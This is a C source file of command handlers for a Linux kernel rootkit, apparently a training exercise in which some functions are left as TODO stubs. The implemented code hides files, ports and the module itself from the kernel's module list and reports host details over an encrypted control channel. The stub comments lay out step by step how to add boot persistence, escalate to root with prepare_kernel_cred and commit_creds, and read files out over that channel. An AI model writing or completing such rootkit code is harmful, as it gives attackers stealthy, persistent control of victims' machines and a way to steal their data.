// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - All command handler implementations.
//                        Each handler has signature: int fn(rk_session *, const char *arg)
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/sched/task.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>

#include "rootkit.h"

// Helper: send a string response through the encrypted channel.
static int reply(struct rk_session *s, const char *msg)
{
	return rk_send_sealed(s, (const u8 *)msg, strlen(msg));
}

// PING -> PONG
int rk_cmd_ping(struct rk_session *s, const char *arg)
{
	return reply(s, "PONG");
}

// INFO: kernel version, hostname, architecture
int rk_cmd_info(struct rk_session *s, const char *arg)
{
	struct new_utsname *uts = utsname();
	char buf[RK_BUF_MAX];
	int n;

	n = snprintf(buf, sizeof(buf),
		     "sysname: %s\nnodename: %s\nrelease: %s\n"
		     "version: %s\nmachine: %s",
		     uts->sysname, uts->nodename, uts->release,
		     uts->version, uts->machine);
	return rk_send_sealed(s, (const u8 *)buf, n);
}

/*
 * TODO: Implement rk_cmd_status
 *
 * Send the current state as key-value pairs through the encrypted channel:
 *   files: <rk_file_targets.count>
 *   pids: <rk_pid_targets.count>
 *   contents: <rk_content_targets.count>
 *   ports: <rk_port_targets.count>
 *   cloaked: yes/no (rk_module_hidden)
 *   persisted: yes/no (rk_persist_active)
 *
 * Use snprintf into a buf[RK_BUF_MAX], then rk_send_sealed.
 */
int rk_cmd_status(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

// LIST <category>: list entries in a target list
int rk_cmd_list(struct rk_session *s, const char *category)
{
	char buf[RK_BUF_MAX];
	int n, i, total;

	if (strcmp(category, "FILE") == 0) {
		total = rk_file_targets.count;
		if (total == 0)
			return reply(s, "empty");
		n = 0;
		for (i = 0; i < total; i++)
			n += snprintf(buf + n, sizeof(buf) - n,
				      "[%d] %s\n", i,
				      rk_file_targets.targets[i]);
	} else if (strcmp(category, "PID") == 0) {
		total = rk_pid_targets.count;
		if (total == 0)
			return reply(s, "empty");
		n = 0;
		for (i = 0; i < total; i++)
			n += snprintf(buf + n, sizeof(buf) - n,
				      "[%d] %s\n", i,
				      rk_pid_targets.targets[i]);
	} else if (strcmp(category, "CONTENT") == 0) {
		total = rk_content_targets.count;
		if (total == 0)
			return reply(s, "empty");
		n = 0;
		for (i = 0; i < total; i++)
			n += snprintf(buf + n, sizeof(buf) - n,
				      "[%d] %s\n", i,
				      rk_content_targets.targets[i]);
	} else if (strcmp(category, "PORT") == 0) {
		total = rk_port_targets.count;
		if (total == 0)
			return reply(s, "empty");
		n = 0;
		for (i = 0; i < total; i++)
			n += snprintf(buf + n, sizeof(buf) - n,
				      "[%d] %u\n", i,
				      rk_port_targets.ports[i]);
	} else {
		return reply(s, "unknown category");
	}
	return rk_send_sealed(s, (const u8 *)buf, n);
}

// HIDE FILE <name>
int rk_cmd_hide_file(struct rk_session *s, const char *arg)
{
	int error = rk_target_add(&rk_file_targets, arg);

	if (error == -ENOSPC)
		return reply(s, "full");
	if (error == -ENAMETOOLONG)
		return reply(s, "too long");
	return reply(s, "hidden");
}

/*
 * TODO: Implement rk_cmd_hide_pid
 *
 * Same pattern as rk_cmd_hide_file but adds to rk_pid_targets.
 * Handle -ENOSPC ("full") and -ENAMETOOLONG ("too long").
 */
int rk_cmd_hide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_cmd_hide_content
 *
 * Same pattern as rk_cmd_hide_file but adds to rk_content_targets.
 */
int rk_cmd_hide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

// HIDE PORT <port>
int rk_cmd_hide_port(struct rk_session *s, const char *arg)
{
	unsigned short port;
	int error;

	if (kstrtou16(arg, 10, &port) || port == 0)
		return reply(s, "invalid port");
	error = rk_port_add(&rk_port_targets, port);
	if (error == -ENOSPC)
		return reply(s, "full");
	return reply(s, "hidden");
}

// UNHIDE FILE <name>
int rk_cmd_unhide_file(struct rk_session *s, const char *arg)
{
	if (rk_target_remove(&rk_file_targets, arg))
		return reply(s, "not found");
	return reply(s, "unhidden");
}

/*
 * TODO: Implement rk_cmd_unhide_pid
 *
 * Call rk_target_remove(&rk_pid_targets, arg).
 * Return "not found" if remove fails, "unhidden" on success.
 */
int rk_cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_cmd_unhide_content
 *
 * Call rk_target_remove(&rk_content_targets, arg).
 * Return "not found" if remove fails, "unhidden" on success.
 */
int rk_cmd_unhide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_cmd_unhide_port
 *
 * Parse the port with kstrtou16. Reject if invalid or zero ("invalid port").
 * Call rk_port_remove. Return "not found" or "unhidden".
 */
int rk_cmd_unhide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

// UNHIDE ALL: clear every target list
int rk_cmd_unhide_all(struct rk_session *s, const char *arg)
{
	unsigned long flags;

	spin_lock_irqsave(&rk_file_targets.lock, flags);
	rk_file_targets.count = 0;
	spin_unlock_irqrestore(&rk_file_targets.lock, flags);

	spin_lock_irqsave(&rk_pid_targets.lock, flags);
	rk_pid_targets.count = 0;
	spin_unlock_irqrestore(&rk_pid_targets.lock, flags);

	spin_lock_irqsave(&rk_content_targets.lock, flags);
	rk_content_targets.count = 0;
	spin_unlock_irqrestore(&rk_content_targets.lock, flags);

	spin_lock_irqsave(&rk_port_targets.lock, flags);
	rk_port_targets.count = 0;
	spin_unlock_irqrestore(&rk_port_targets.lock, flags);

	return reply(s, "cleared");
}

// HIDE MODULE: remove from module list
int rk_cmd_hide_module(struct rk_session *s, const char *arg)
{
	if (rk_module_hidden)
		return reply(s, "already hidden");

	rk_saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	rk_module_hidden = true;
	return reply(s, "module hidden");
}

// UNHIDE MODULE: restore to module list
int rk_cmd_unhide_module(struct rk_session *s, const char *arg)
{
	if (!rk_module_hidden)
		return reply(s, "already visible");

	list_add(&THIS_MODULE->list, rk_saved_prev);
	rk_module_hidden = false;
	return reply(s, "module visible");
}

/*
 * TODO: Implement rk_cmd_persist
 *
 * Write "rklings\n" to /etc/modules-load.d/rklings.conf using
 * filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644) and kernel_write.
 * Set rk_persist_active = true on success.
 * Reply "persisted" or "persist failed".
 */
int rk_cmd_persist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_cmd_unpersist
 *
 * Remove or truncate /etc/modules-load.d/rklings.conf.
 * Set rk_persist_active = false on success.
 * Reply "unpersisted" or "not persisted".
 */
int rk_cmd_unpersist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_cmd_escalate
 *
 * Use prepare_kernel_cred(&init_task) to create root credentials.
 * If it succeeds, call commit_creds(new) and reply "escalated".
 * If it fails, reply "escalate failed".
 */
int rk_cmd_escalate(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_cmd_download
 *
 * 1. Open the file at path with filp_open(path, O_RDONLY, 0).
 *    If it fails, reply "file not found".
 * 2. Allocate a buf[RK_BUF_MAX] with kmalloc.
 * 3. Read in chunks with kernel_read, sending each chunk
 *    via rk_send_sealed.
 * 4. Send an empty sealed message to signal end of file:
 *    rk_send_sealed(s, (const u8 *)"", 0)
 * 5. kfree(buf), filp_close(fp, NULL).
 */
int rk_cmd_download(struct rk_session *s, const char *path)
{
	return -ENOSYS;
}
